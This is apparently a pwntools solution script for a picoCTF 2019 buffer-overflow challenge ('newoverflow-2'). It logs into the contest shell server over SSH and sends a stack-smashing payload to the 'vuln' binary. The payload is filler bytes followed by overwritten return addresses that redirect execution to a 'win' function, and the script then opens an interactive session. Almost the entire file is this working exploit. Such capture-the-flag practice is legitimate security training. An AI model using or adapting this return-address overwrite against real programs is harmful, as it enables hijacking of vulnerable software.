from os import environ
from pwn import *

PATH='/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df'
EXEC='vuln'

win_fn2_addr = 0x00400781 #    6 61           sym.win_fn2
win_fn__addr = 0x004007be #    7 143          sym.win_fn 
win_fn1_addr = 0x00400767 #    3 26           sym.win_fn1

main_call_adr = 0x004008ce

do_win1 = (0x40+8)*b'x' + p64(main_call_adr) + p64(win_fn1_addr) + b'x'*4 + p64(0xDEADBEEF)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter(' Can you match these numbers?', do_win1)
sh.interactive()
# x = sh.recvrepeat()

# print(x.decode(errors='ignore'))

s.close()
